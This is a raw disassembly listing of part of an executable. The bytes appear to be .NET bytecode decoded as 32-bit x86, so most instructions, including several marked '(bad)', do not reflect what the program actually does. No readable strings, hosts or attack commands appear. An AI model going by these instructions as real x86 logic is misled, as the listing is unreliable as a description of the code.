  40537d:	28 45 00             	sub    %al,0x0(%ebp)
  405380:	00 06                	add    %al,(%esi)
  405382:	13 06                	adc    (%esi),%eax
  405384:	02 11                	add    (%ecx),%dl
  405386:	06                   	push   %es
  405387:	02 7b 8d             	add    -0x73(%ebx),%bh
  40538a:	00 00                	add    %al,(%eax)
  40538c:	04 28                	add    $0x28,%al
  40538e:	45                   	inc    %ebp
  40538f:	00 00                	add    %al,(%eax)
  405391:	06                   	push   %es
  405392:	7d 8d                	jge    0x405321
  405394:	00 00                	add    %al,(%eax)
  405396:	04 02                	add    $0x2,%al
  405398:	02 7b 8d             	add    -0x73(%ebx),%bh
  40539b:	00 00                	add    %al,(%eax)
  40539d:	04 07                	add    $0x7,%al
  40539f:	7b 70                	jnp    0x405411
  4053a1:	00 00                	add    %al,(%eax)
  4053a3:	04 28                	add    $0x28,%al
  4053a5:	0e                   	push   %cs
  4053a6:	00 00                	add    %al,(%eax)
  4053a8:	06                   	push   %es
  4053a9:	7d 8d                	jge    0x405338
  4053ab:	00 00                	add    %al,(%eax)
  4053ad:	04 02                	add    $0x2,%al
  4053af:	17                   	pop    %ss
  4053b0:	8d 2e                	lea    (%esi),%ebp
  4053b2:	00 00                	add    %al,(%eax)
  4053b4:	01 25 16 19 9c 02    	add    %esp,0x29c1916
  4053ba:	7b 8d                	jnp    0x405349
  4053bc:	00 00                	add    %al,(%eax)
  4053be:	04 28                	add    $0x28,%al
  4053c0:	45                   	inc    %ebp
  4053c1:	00 00                	add    %al,(%eax)
  4053c3:	06                   	push   %es
  4053c4:	7d 8d                	jge    0x405353
  4053c6:	00 00                	add    %al,(%eax)
  4053c8:	04 07                	add    $0x7,%al
  4053ca:	02 7b 8d             	add    -0x73(%ebx),%bh
  4053cd:	00 00                	add    %al,(%eax)
  4053cf:	04 8e                	add    $0x8e,%al
  4053d1:	69 28 4b 00 00 06    	imul   $0x600004b,(%eax),%ebp
  4053d7:	13 07                	adc    (%edi),%eax
  4053d9:	02 11                	add    (%ecx),%dl
  4053db:	07                   	pop    %es
  4053dc:	02 7b 8d             	add    -0x73(%ebx),%bh
  4053df:	00 00                	add    %al,(%eax)
  4053e1:	04 28                	add    $0x28,%al
  4053e3:	45                   	inc    %ebp
  4053e4:	00 00                	add    %al,(%eax)
  4053e6:	06                   	push   %es
  4053e7:	7d 8d                	jge    0x405376
  4053e9:	00 00                	add    %al,(%eax)
  4053eb:	04 07                	add    $0x7,%al
  4053ed:	7b 6f                	jnp    0x40545e
  4053ef:	00 00                	add    %al,(%eax)
  4053f1:	04 02                	add    $0x2,%al
  4053f3:	7b 8d                	jnp    0x405382
  4053f5:	00 00                	add    %al,(%eax)
  4053f7:	04 73                	add    $0x73,%al
  4053f9:	ad                   	lods   %ds:(%esi),%eax
  4053fa:	00 00                	add    %al,(%eax)
  4053fc:	0a 16                	or     (%esi),%dl
  4053fe:	28 ae 00 00 0a 6f    	sub    %ch,0x6f0a0000(%esi)
  405404:	a8 00                	test   $0x0,%al
  405406:	00 0a                	add    %cl,(%edx)
  405408:	13 08                	adc    (%eax),%ecx
  40540a:	12 08                	adc    (%eax),%cl
  40540c:	28 a9 00 00 0a 2d    	sub    %ch,0x2d0a0000(%ecx)
  405412:	3e 02 16             	add    %ds:(%esi),%dl
  405415:	25 0a 7d 8b 00       	and    $0x8b7d0a,%eax
  40541a:	00 04 02             	add    %al,(%edx,%eax,1)
  40541d:	11 08                	adc    %ecx,(%eax)
  40541f:	7d 8f                	jge    0x4053b0
  405421:	00 00                	add    %al,(%eax)
  405423:	04 02                	add    $0x2,%al
  405425:	7c 8c                	jl     0x4053b3
  405427:	00 00                	add    %al,(%eax)
  405429:	04 12                	add    $0x12,%al
  40542b:	08 02                	or     %al,(%edx)
  40542d:	28 38                	sub    %bh,(%eax)
  40542f:	00 00                	add    %al,(%eax)
  405431:	2b de                	sub    %esi,%ebx
  405433:	5b                   	pop    %ebx
  405434:	02 7b 8f             	add    -0x71(%ebx),%bh
  405437:	00 00                	add    %al,(%eax)
  405439:	04 13                	add    $0x13,%al
  40543b:	08 02                	or     %al,(%edx)
  40543d:	7c 8f                	jl     0x4053ce
  40543f:	00 00                	add    %al,(%eax)
  405441:	04 fe                	add    $0xfe,%al
  405443:	15 18 00 00 1b       	adc    $0x1b000018,%eax
  405448:	02 15 25 0a 7d 8b    	add    0x8b7d0a25,%dl
  40544e:	00 00                	add    %al,(%eax)
  405450:	04 12                	add    $0x12,%al
  405452:	08 28                	or     %ch,(%eax)
  405454:	aa                   	stos   %al,%es:(%edi)
  405455:	00 00                	add    %al,(%eax)
  405457:	0a 26                	or     (%esi),%ah
  405459:	17                   	pop    %ss
  40545a:	0c de                	or     $0xde,%al
  40545c:	1e                   	push   %ds
  40545d:	26 16                	es push %ss
  40545f:	0c de                	or     $0xde,%al
  405461:	19 13                	sbb    %edx,(%ebx)
  405463:	09 02                	or     %eax,(%edx)
  405465:	1f                   	pop    %ds
  405466:	fe                   	(bad)
  405467:	7d 8b                	jge    0x4053f4
  405469:	00 00                	add    %al,(%eax)
  40546b:	04 02                	add    $0x2,%al
  40546d:	7c 8c                	jl     0x4053fb
  40546f:	00 00                	add    %al,(%eax)
  405471:	04 11                	add    $0x11,%al
  405473:	09 28                	or     %ebp,(%eax)
  405475:	7c 00                	jl     0x405477
  405477:	00 0a                	add    %cl,(%edx)
  405479:	de 14 02             	ficoms (%edx,%eax,1)
  40547c:	1f                   	pop    %ds
  40547d:	fe                   	(bad)
  40547e:	7d 8b                	jge    0x40540b
  405480:	00 00                	add    %al,(%eax)
  405482:	04 02                	add    $0x2,%al
  405484:	7c 8c                	jl     0x405412
  405486:	00 00                	add    %al,(%eax)
  405488:	04 08                	add    $0x8,%al
  40548a:	28 7d 00             	sub    %bh,0x0(%ebp)
  40548d:	00 0a                	add    %cl,(%edx)
  40548f:	2a 41 34             	sub    0x34(%ecx),%al
  405492:	00 00                	add    %al,(%eax)
  405494:	00 00                	add    %al,(%eax)
  405496:	00 00                	add    %al,(%eax)
  405498:	2a 00                	sub    (%eax),%al
  40549a:	00 00                	add    %al,(%eax)
  40549c:	2f                   	das
  40549d:	01 00                	add    %eax,(%eax)
  40549f:	00 59 01             	add    %bl,0x1(%ecx)
  4054a2:	00 00                	add    %al,(%eax)
  4054a4:	05 00 00 00 01       	add    $0x1000000,%eax
  4054a9:	00 00                	add    %al,(%eax)
  4054ab:	01 00                	add    %eax,(%eax)
  4054ad:	00 00                	add    %al,(%eax)
  4054af:	00 0e                	add    %cl,(%esi)
  4054b1:	00 00                	add    %al,(%eax)
  4054b3:	00 50 01             	add    %dl,0x1(%eax)
  4054b6:	00 00                	add    %al,(%eax)
  4054b8:	5e                   	pop    %esi
  4054b9:	01 00                	add    %eax,(%eax)
  4054bb:	00 19                	add    %bl,(%ecx)
  4054bd:	00 00                	add    %al,(%eax)
  4054bf:	00 0b                	add    %cl,(%ebx)
  4054c1:	00 00                	add    %al,(%eax)
  4054c3:	01 13                	add    %edx,(%ebx)
  4054c5:	30 03                	xor    %al,(%ebx)
  4054c7:	00 b5 01 00 00 2a    	add    %dh,0x2a000001(%ebp)
  4054cd:	00 00                	add    %al,(%eax)
  4054cf:	11 12                	adc    %edx,(%edx)
  4054d1:	00 73 b0             	add    %dh,-0x50(%ebx)
  4054d4:	00 00                	add    %al,(%eax)
  4054d6:	0a 72 cb             	or     -0x35(%edx),%dh
  4054d9:	00 00                	add    %al,(%eax)
  4054db:	70 6f                	jo     0x40554c
  4054dd:	b1 00                	mov    $0x0,%cl
  4054df:	00 0a                	add    %cl,(%edx)
  4054e1:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  4054e6:	00 28                	add    %ch,(%eax)
  4054e8:	b2 00                	mov    $0x0,%dl
  4054ea:	00 0a                	add    %cl,(%edx)
  4054ec:	73 b0                	jae    0x40549e
  4054ee:	00 00                	add    %al,(%eax)
  4054f0:	0a 72 f3             	or     -0xd(%edx),%dh
  4054f3:	00 00                	add    %al,(%eax)
  4054f5:	70 6f                	jo     0x405566
  4054f7:	b1 00                	mov    $0x0,%cl
  4054f9:	00 0a                	add    %cl,(%edx)
  4054fb:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405500:	00 28                	add    %ch,(%eax)
  405502:	b2 00                	mov    $0x0,%dl
  405504:	00 0a                	add    %cl,(%edx)
  405506:	73 b0                	jae    0x4054b8
  405508:	00 00                	add    %al,(%eax)
  40550a:	0a 72 2d             	or     0x2d(%edx),%dh
  40550d:	01 00                	add    %eax,(%eax)
  40550f:	70 6f                	jo     0x405580
  405511:	b1 00                	mov    $0x0,%cl
  405513:	00 0a                	add    %cl,(%edx)
  405515:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  40551a:	00 28                	add    %ch,(%eax)
  40551c:	b2 00                	mov    $0x0,%dl
  40551e:	00 0a                	add    %cl,(%edx)
  405520:	73 b0                	jae    0x4054d2
  405522:	00 00                	add    %al,(%eax)
  405524:	0a 72 67             	or     0x67(%edx),%dh
  405527:	01 00                	add    %eax,(%eax)
  405529:	70 6f                	jo     0x40559a
  40552b:	b1 00                	mov    $0x0,%cl
  40552d:	00 0a                	add    %cl,(%edx)
  40552f:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405534:	00 28                	add    %ch,(%eax)
  405536:	b2 00                	mov    $0x0,%dl
  405538:	00 0a                	add    %cl,(%edx)
  40553a:	73 b0                	jae    0x4054ec
  40553c:	00 00                	add    %al,(%eax)
  40553e:	0a 72 9f             	or     -0x61(%edx),%dh
  405541:	01 00                	add    %eax,(%eax)
  405543:	70 6f                	jo     0x4055b4
  405545:	b1 00                	mov    $0x0,%cl
  405547:	00 0a                	add    %cl,(%edx)
  405549:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  40554e:	00 28                	add    %ch,(%eax)
  405550:	b2 00                	mov    $0x0,%dl
  405552:	00 0a                	add    %cl,(%edx)
  405554:	73 b0                	jae    0x405506
  405556:	00 00                	add    %al,(%eax)
  405558:	0a 72 df             	or     -0x21(%edx),%dh
  40555b:	01 00                	add    %eax,(%eax)
  40555d:	70 6f                	jo     0x4055ce
  40555f:	b1 00                	mov    $0x0,%cl
  405561:	00 0a                	add    %cl,(%edx)
  405563:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405568:	00 28                	add    %ch,(%eax)
  40556a:	b2 00                	mov    $0x0,%dl
  40556c:	00 0a                	add    %cl,(%edx)
  40556e:	73 b0                	jae    0x405520
  405570:	00 00                	add    %al,(%eax)
  405572:	0a 72 0f             	or     0xf(%edx),%dh
  405575:	02 00                	add    (%eax),%al
  405577:	70 6f                	jo     0x4055e8
  405579:	b1 00                	mov    $0x0,%cl
  40557b:	00 0a                	add    %cl,(%edx)
  40557d:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405582:	00 28                	add    %ch,(%eax)
  405584:	b2 00                	mov    $0x0,%dl
  405586:	00 0a                	add    %cl,(%edx)
  405588:	73 b0                	jae    0x40553a
  40558a:	00 00                	add    %al,(%eax)
  40558c:	0a 72 51             	or     0x51(%edx),%dh
  40558f:	02 00                	add    (%eax),%al
  405591:	70 6f                	jo     0x405602
  405593:	b1 00                	mov    $0x0,%cl
  405595:	00 0a                	add    %cl,(%edx)
  405597:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  40559c:	00 28                	add    %ch,(%eax)
  40559e:	b2 00                	mov    $0x0,%dl
  4055a0:	00 0a                	add    %cl,(%edx)
  4055a2:	73 b0                	jae    0x405554
  4055a4:	00 00                	add    %al,(%eax)
  4055a6:	0a 72 93             	or     -0x6d(%edx),%dh
  4055a9:	02 00                	add    (%eax),%al
  4055ab:	70 6f                	jo     0x40561c
  4055ad:	b1 00                	mov    $0x0,%cl
  4055af:	00 0a                	add    %cl,(%edx)
  4055b1:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  4055b6:	00 28                	add    %ch,(%eax)
  4055b8:	b2 00                	mov    $0x0,%dl
  4055ba:	00 0a                	add    %cl,(%edx)
  4055bc:	73 b0                	jae    0x40556e
  4055be:	00 00                	add    %al,(%eax)
  4055c0:	0a 72 d3             	or     -0x2d(%edx),%dh
  4055c3:	02 00                	add    (%eax),%al
  4055c5:	70 6f                	jo     0x405636
  4055c7:	b1 00                	mov    $0x0,%cl
  4055c9:	00 0a                	add    %cl,(%edx)
  4055cb:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  4055d0:	00 28                	add    %ch,(%eax)
  4055d2:	b2 00                	mov    $0x0,%dl
  4055d4:	00 0a                	add    %cl,(%edx)
  4055d6:	73 b0                	jae    0x405588
  4055d8:	00 00                	add    %al,(%eax)
  4055da:	0a 72 1b             	or     0x1b(%edx),%dh
  4055dd:	03 00                	add    (%eax),%eax
  4055df:	70 6f                	jo     0x405650
  4055e1:	b1 00                	mov    $0x0,%cl
  4055e3:	00 0a                	add    %cl,(%edx)
  4055e5:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  4055ea:	00 28                	add    %ch,(%eax)
  4055ec:	b2 00                	mov    $0x0,%dl
  4055ee:	00 0a                	add    %cl,(%edx)
  4055f0:	73 b0                	jae    0x4055a2
  4055f2:	00 00                	add    %al,(%eax)
  4055f4:	0a 72 45             	or     0x45(%edx),%dh
  4055f7:	03 00                	add    (%eax),%eax
  4055f9:	70 6f                	jo     0x40566a
  4055fb:	b1 00                	mov    $0x0,%cl
  4055fd:	00 0a                	add    %cl,(%edx)
  4055ff:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405604:	00 28                	add    %ch,(%eax)
  405606:	b2 00                	mov    $0x0,%dl
  405608:	00 0a                	add    %cl,(%edx)
  40560a:	73 b0                	jae    0x4055bc
  40560c:	00 00                	add    %al,(%eax)
  40560e:	0a 72 81             	or     -0x7f(%edx),%dh
  405611:	03 00                	add    (%eax),%eax
  405613:	70 6f                	jo     0x405684
  405615:	b1 00                	mov    $0x0,%cl
  405617:	00 0a                	add    %cl,(%edx)
  405619:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  40561e:	00 28                	add    %ch,(%eax)
  405620:	b2 00                	mov    $0x0,%dl
  405622:	00 0a                	add    %cl,(%edx)
  405624:	73 b0                	jae    0x4055d6
  405626:	00 00                	add    %al,(%eax)
  405628:	0a 72 bd             	or     -0x43(%edx),%dh
  40562b:	03 00                	add    (%eax),%eax
  40562d:	70 6f                	jo     0x40569e
  40562f:	b1 00                	mov    $0x0,%cl
  405631:	00 0a                	add    %cl,(%edx)
  405633:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405638:	00 28                	add    %ch,(%eax)
  40563a:	b2 00                	mov    $0x0,%dl
  40563c:	00 0a                	add    %cl,(%edx)
  40563e:	73 b0                	jae    0x4055f0
  405640:	00 00                	add    %al,(%eax)
  405642:	0a 72 f7             	or     -0x9(%edx),%dh
  405645:	03 00                	add    (%eax),%eax
  405647:	70 6f                	jo     0x4056b8
  405649:	b1 00                	mov    $0x0,%cl
  40564b:	00 0a                	add    %cl,(%edx)
  40564d:	26 20 64 00 00       	and    %ah,%es:0x0(%eax,%eax,1)
  405652:	00 28                	add    %ch,(%eax)
  405654:	b2 00                	mov    $0x0,%dl
  405656:	00 0a                	add    %cl,(%edx)
  405658:	28 1b                	sub    %bl,(%ebx)
  40565a:	00 00                	add    %al,(%eax)
  40565c:	0a 7d 9c             	or     -0x64(%ebp),%bh
  40565f:	00 00                	add    %al,(%eax)
  405661:	04 12                	add    $0x12,%al
  405663:	00 15 7d 9b 00 00    	add    %dl,0x9b7d
  405669:	04 12                	add    $0x12,%al
  40566b:	00 7c 9c 00          	add    %bh,0x0(%esp,%ebx,4)
  40566f:	00 04 12             	add    %al,(%edx,%edx,1)
  405672:	00 28                	add    %ch,(%eax)
  405674:	39 00                	cmp    %eax,(%eax)
  405676:	00 2b                	add    %ch,(%ebx)
  405678:	12 00                	adc    (%eax),%al
  40567a:	7c 9c                	jl     0x405618
  40567c:	00 00                	add    %al,(%eax)
  40567e:	04 28                	add    $0x28,%al
  405680:	1d 00 00 0a 2a       	sbb    $0x2a0a0000,%eax
  405685:	00 00                	add    %al,(%eax)
  405687:	00 1b                	add    %bl,(%ebx)
  405689:	30 06                	xor    %al,(%esi)
  40568b:	00 b7 00 00 00 2b    	add    %dh,0x2b000000(%edi)
  405691:	00 00                	add    %al,(%eax)
  405693:	11 03                	adc    %eax,(%ebx)
  405695:	6f                   	outsl  %ds:(%esi),(%dx)
  405696:	b4 00                	mov    $0x0,%ah
  405698:	00 0a                	add    %cl,(%edx)
  40569a:	75 0b                	jne    0x4056a7
  40569c:	00 00                	add    %al,(%eax)
  40569e:	01 0a                	add    %ecx,(%edx)
  4056a0:	7e 90                	jle    0x405632
  4056a2:	00 00                	add    %al,(%eax)
  4056a4:	04 39                	add    $0x39,%al
  4056a6:	81 00 00 00 7e 90    	addl   $0x907e0000,(%eax)
  4056ac:	00 00                	add    %al,(%eax)
  4056ae:	04 7b                	add    $0x7b,%al
  4056b0:	46                   	inc    %esi
  4056b1:	00 00                	add    %al,(%eax)
  4056b3:	04 6f                	add    $0x6f,%al
  4056b5:	91                   	xchg   %eax,%ecx
  4056b6:	00 00                	add    %al,(%eax)
  4056b8:	0a 0b                	or     (%ebx),%cl
  4056ba:	2b 56 12             	sub    0x12(%esi),%edx
  4056bd:	01 28                	add    %ebp,(%eax)
  4056bf:	92                   	xchg   %eax,%edx
  4056c0:	00 00                	add    %al,(%eax)
  4056c2:	0a 0c 08             	or     (%eax,%ecx,1),%cl
  4056c5:	7b 4b                	jnp    0x405712
  4056c7:	00 00                	add    %al,(%eax)
  4056c9:	04 17                	add    $0x17,%al
  4056cb:	33 45 08             	xor    0x8(%ebp),%eax
  4056ce:	17                   	pop    %ss
  4056cf:	8d 2e                	lea    (%esi),%ebp
  4056d1:	00 00                	add    %al,(%eax)
  4056d3:	01 25 16 19 9c 28    	add    %esp,0x289c1916
  4056d9:	27                   	daa
  4056da:	00 00                	add    %al,(%eax)
  4056dc:	0a 06                	or     (%esi),%al
  4056de:	6f                   	outsl  %ds:(%esi),(%dx)
  4056df:	3a 00                	cmp    (%eax),%al
  4056e1:	00 0a                	add    %cl,(%edx)
  4056e3:	28 b5 00 00 0a 06    	sub    %dh,0x60a0000(%ebp)
  4056e9:	6f                   	outsl  %ds:(%esi),(%dx)
  4056ea:	3c 00                	cmp    $0x0,%al
  4056ec:	00 0a                	add    %cl,(%edx)
  4056ee:	28 65 00             	sub    %ah,0x0(%ebp)
  4056f1:	00 0a                	add    %cl,(%edx)
  4056f3:	6f                   	outsl  %ds:(%esi),(%dx)
  4056f4:	3b 00                	cmp    (%eax),%eax
  4056f6:	00 0a                	add    %cl,(%edx)
  4056f8:	28 45 00             	sub    %al,0x0(%ebp)
  4056fb:	00 06                	add    %al,(%esi)
  4056fd:	6f                   	outsl  %ds:(%esi),(%dx)
  4056fe:	32 00                	xor    (%eax),%al
  405700:	00 06                	add    %al,(%esi)
  405702:	6f                   	outsl  %ds:(%esi),(%dx)
  405703:	b6 00                	mov    $0x0,%dh
  405705:	00 0a                	add    %cl,(%edx)
  405707:	26 20 e8             	es and %ch,%al
  40570a:	03 00                	add    (%eax),%eax
  40570c:	00 28                	add    %ch,(%eax)
  40570e:	b2 00                	mov    $0x0,%dl
  405710:	00 0a                	add    %cl,(%edx)
  405712:	12 01                	adc    (%ecx),%al
  405714:	28 93 00 00 0a 2d    	sub    %dl,0x2d0a0000(%ebx)
  40571a:	a1 de 0e 12 01       	mov    0x1120ede,%eax
  40571f:	fe                   	(bad)
  405720:	16                   	push   %ss
  405721:	13 00                	adc    (%eax),%eax
  405723:	00 1b                	add    %bl,(%ebx)
  405725:	6f                   	outsl  %ds:(%esi),(%dx)
  405726:	4b                   	dec    %ebx
  405727:	00 00                	add    %al,(%eax)
  405729:	0a dc                	or     %ah,%bl
  40572b:	de 03                	fiadds (%ebx)
  40572d:	26 de 00             	fiadds %es:(%eax)
  405730:	28 68 00             	sub    %ch,0x0(%eax)
  405733:	00 0a                	add    %cl,(%edx)
  405735:	6f                   	outsl  %ds:(%esi),(%dx)
  405736:	69 00 00 0a 28 6a    	imul   $0x6a280a00,(%eax),%eax
  40573c:	00 00                	add    %al,(%eax)
  40573e:	0a 26                	or     (%esi),%ah
  405740:	28 66 00             	sub    %ah,0x0(%esi)
  405743:	00 0a                	add    %cl,(%edx)
  405745:	6f                   	outsl  %ds:(%esi),(%dx)
  405746:	67 00 00             	add    %al,(%bx,%si)
  405749:	0a 2a                	or     (%edx),%ch
  40574b:	00 01                	add    %al,(%ecx)
  40574d:	1c 00                	sbb    $0x0,%al
  40574f:	00 02                	add    %al,(%edx)
  405751:	00 26                	add    %ah,(%esi)
  405753:	00 63 89             	add    %ah,-0x77(%ebx)
  405756:	00 0e                	add    %cl,(%esi)
  405758:	00 00                	add    %al,(%eax)
  40575a:	00 00                	add    %al,(%eax)
  40575c:	00 00                	add    %al,(%eax)
  40575e:	0c 00                	or     $0x0,%al
  405760:	8d 99 00 03 01 00    	lea    0x10300(%ecx),%ebx
  405766:	00 01                	add    %al,(%ecx)
  405768:	13 30                	adc    (%eax),%esi
  40576a:	03 00                	add    (%eax),%eax
  40576c:	72 00                	jb     0x40576e
  40576e:	00 00                	add    %al,(%eax)
  405770:	00 00                	add    %al,(%eax)
  405772:	00 00                	add    %al,(%eax)
  405774:	73 09                	jae    0x40577f
  405776:	00 00                	add    %al,(%eax)
  405778:	06                   	push   %es
  405779:	80 91 00 00 04 72 39 	adcb   $0x39,0x72040000(%ecx)
  405780:	04 00                	add    $0x0,%al
  405782:	70 80                	jo     0x405704
  405784:	92                   	xchg   %eax,%edx
  405785:	00 00                	add    %al,(%eax)
  405787:	04 20                	add    $0x20,%al
  405789:	bb 01 00 00 80       	mov    $0x80000001,%ebx
  40578e:	93                   	xchg   %eax,%ebx
  40578f:	00 00                	add    %al,(%eax)
  405791:	04 1f                	add    $0x1f,%al
  405793:	20 8d 2e 00 00 01    	and    %cl,0x100002e(%ebp)
  405799:	25 d0 d0 00 00       	and    $0xd0d0,%eax
  40579e:	04 28                	add    $0x28,%al
  4057a0:	7a 00                	jp     0x4057a2
  4057a2:	00 0a                	add    %cl,(%edx)
  4057a4:	80 94 00 00 04 20 50 	adcb   $0xc3,0x50200400(%eax,%eax,1)
  4057ab:	c3 
  4057ac:	00 00                	add    %al,(%eax)
  4057ae:	80 95 00 00 04 72 51 	adcb   $0x51,0x72040000(%ebp)
  4057b5:	04 00                	add    $0x0,%al
  4057b7:	70 80                	jo     0x405739
  4057b9:	96                   	xchg   %eax,%esi
  4057ba:	00 00                	add    %al,(%eax)
  4057bc:	04 20                	add    $0x20,%al
  4057be:	ae                   	scas   %es:(%edi),%al
  4057bf:	08 00                	or     %al,(%eax)
  4057c1:	00 80 97 00 00 04    	add    %al,0x4000097(%eax)
  4057c7:	72 73                	jb     0x40583c
  4057c9:	04 00                	add    $0x0,%al
  4057cb:	70 80                	jo     0x40574d
  4057cd:	98                   	cwtl
  4057ce:	00 00                	add    %al,(%eax)
  4057d0:	04 72                	add    $0x72,%al
  4057d2:	83 04 00 70          	addl   $0x70,(%eax,%eax,1)
  4057d6:	80 99 00 00 04 73 b7 	sbbb   $0xb7,0x73040000(%ecx)
  4057dd:	00 00                	add    %al,(%eax)
  4057df:	0a 80 9a 00 00 04    	or     0x400009a(%eax),%al
  4057e5:	2a 00                	sub    (%eax),%al
  4057e7:	00 13                	add    %dl,(%ebx)
  4057e9:	30 01                	xor    %al,(%ecx)
  4057eb:	00 14 00             	add    %dl,(%eax,%eax,1)
  4057ee:	00 00                	add    %al,(%eax)
  4057f0:	2c 00                	sub    $0x0,%al
  4057f2:	00 11                	add    %dl,(%ecx)
  4057f4:	02 28                	add    (%eax),%ch
  4057f6:	59                   	pop    %ecx
  4057f7:	00 00                	add    %al,(%eax)
  4057f9:	06                   	push   %es
  4057fa:	6f                   	outsl  %ds:(%esi),(%dx)
  4057fb:	37                   	aaa
  4057fc:	00 00                	add    %al,(%eax)
  4057fe:	0a 0a                	or     (%edx),%cl
  405800:	12 00                	adc    (%eax),%al
  405802:	28 39                	sub    %bh,(%ecx)
  405804:	00 00                	add    %al,(%eax)
  405806:	0a 2a                	or     (%edx),%ch
  405808:	1b 30                	sbb    (%eax),%esi
  40580a:	06                   	push   %es
  40580b:	00 d5                	add    %dl,%ch
  40580d:	04 00                	add    $0x0,%al
  40580f:	00 2d 00 00 11 02    	add    %ch,0x2110000
  405815:	7b 9b                	jnp    0x4057b2
  405817:	00 00                	add    %al,(%eax)
  405819:	04 0a                	add    $0xa,%al
  40581b:	06                   	push   %es
  40581c:	45                   	inc    %ebp
  40581d:	07                   	pop    %es
  40581e:	00 00                	add    %al,(%eax)
  405820:	00 15 01 00 00 ae    	add    %dl,0xae000001
  405826:	01 00                	add    %eax,(%eax)
  405828:	00 1d 02 00 00 49    	add    %bl,0x49000002
  40582e:	02 00                	add    (%eax),%al
  405830:	00 49 02             	add    %cl,0x2(%ecx)
  405833:	00 00                	add    %al,(%eax)
  405835:	49                   	dec    %ecx
  405836:	02 00                	add    (%eax),%al
  405838:	00 38                	add    %bh,(%eax)
  40583a:	04 00                	add    $0x0,%al
  40583c:	00 28                	add    %ch,(%eax)
  40583e:	b8 00 00 0a 73       	mov    $0x730a0000,%eax
  405843:	61                   	popa
  405844:	00 00                	add    %al,(%eax)
  405846:	06                   	push   %es
  405847:	28 b9 00 00 0a 28    	sub    %bh,0x280a0000(%ecx)
  40584d:	18 00                	sbb    %al,(%eax)
  40584f:	00 0a                	add    %cl,(%edx)
  405851:	14 fe                	adc    $0xfe,%al
  405853:	06                   	push   %es
  405854:	5b                   	pop    %ebx
  405855:	00 00                	add    %al,(%eax)
  405857:	06                   	push   %es
  405858:	73 ba                	jae    0x405814
  40585a:	00 00                	add    %al,(%eax)
  40585c:	0a 6f bb             	or     -0x45(%edi),%ch
  40585f:	00 00                	add    %al,(%eax)
  405861:	0a 28                	or     (%eax),%ch
  405863:	70 00                	jo     0x405865
  405865:	00 06                	add    %al,(%esi)
  405867:	2c 14                	sub    $0x14,%al
  405869:	7e 96                	jle    0x405801
  40586b:	00 00                	add    %al,(%eax)
  40586d:	04 72                	add    $0x72,%al
  40586f:	99                   	cltd
  405870:	04 00                	add    $0x0,%al
  405872:	70 28                	jo     0x40589c
  405874:	52                   	push   %edx
  405875:	00 00                	add    %al,(%eax)
  405877:	0a 80 96 00 00 04    	or     0x4000096(%eax),%al
  40587d:	7e 98                	jle    0x405817
  40587f:	00 00                	add    %al,(%eax)
  405881:	04 72                	add    $0x72,%al
  405883:	83 04 00 70          	addl   $0x70,(%eax,%eax,1)
  405887:	28 bc 00 00 0a 2c 70 	sub    %bh,0x702c0a00(%eax,%eax,1)
  40588e:	72 a7                	jb     0x405837
  405890:	04 00                	add    $0x0,%al
  405892:	70 7e                	jo     0x405912
  405894:	98                   	cwtl
  405895:	00 00                	add    %al,(%eax)
  405897:	04 72                	add    $0x72,%al
  405899:	ab                   	stos   %eax,%es:(%edi)
  40589a:	04 00                	add    $0x0,%al
  40589c:	70 28                	jo     0x4058c6
  40589e:	65 00 00             	add    %al,%gs:(%eax)
  4058a1:	0a 28                	or     (%eax),%ch
  4058a3:	bd 00 00 0a 0c       	mov    $0xc0a0000,%ebp
  4058a8:	28 be 00 00 0a 08    	sub    %bh,0x80a0000(%esi)
  4058ae:	28 bc 00 00 0a 2c 44 	sub    %bh,0x442c0a00(%eax,%eax,1)
  4058b5:	28 68 00             	sub    %ch,0x0(%eax)
  4058b8:	00 0a                	add    %cl,(%edx)
  4058ba:	6f                   	outsl  %ds:(%esi),(%dx)
  4058bb:	69 00 00 0a 0d 08    	imul   $0x80d0a00,(%eax),%eax
  4058c1:	28 bf 00 00 0a 2d    	sub    %bh,0x2d0a0000(%edi)
  4058c7:	07                   	pop    %es
  4058c8:	08 28                	or     %ch,(%eax)
  4058ca:	c0 00 00             	rolb   $0x0,(%eax)
  4058cd:	0a 26                	or     (%esi),%ah
  4058cf:	09 08                	or     %ecx,(%eax)
  4058d1:	09 28                	or     %ebp,(%eax)
  4058d3:	c1 00 00             	roll   $0x0,(%eax)
  4058d6:	0a 28                	or     (%eax),%ch
  4058d8:	52                   	push   %edx
  4058d9:	00 00                	add    %al,(%eax)
  4058db:	0a 28                	or     (%eax),%ch
  4058dd:	c2 00 00             	ret    $0x0
  4058e0:	0a 08                	or     (%eax),%cl
  4058e2:	09 28                	or     %ebp,(%eax)
  4058e4:	c1 00 00             	roll   $0x0,(%eax)
  4058e7:	0a 28                	or     (%eax),%ch
  4058e9:	52                   	push   %edx
  4058ea:	00 00                	add    %al,(%eax)
  4058ec:	0a 28                	or     (%eax),%ch
  4058ee:	6a 00                	push   $0x0
  4058f0:	00 0a                	add    %cl,(%edx)
  4058f2:	26 16                	es push %ss
  4058f4:	28 c3                	sub    %al,%bl
  4058f6:	00 00                	add    %al,(%eax)
  4058f8:	0a de                	or     %dh,%bl
  4058fa:	03 26                	add    (%esi),%esp
  4058fc:	de 00                	fiadds (%eax)
  4058fe:	17                   	pop    %ss
  4058ff:	7e 96                	jle    0x405897
  405901:	00 00                	add    %al,(%eax)
  405903:	04 12                	add    $0x12,%al
  405905:	01 73 c4             	add    %esi,-0x3c(%ebx)
  405908:	00 00                	add    %al,(%eax)
  40590a:	0a 26                	or     (%esi),%ah
  40590c:	07                   	pop    %es
  40590d:	2d 05 dd c1 03       	sub    $0x3c1dd05,%eax
  405912:	00 00                	add    %al,(%eax)
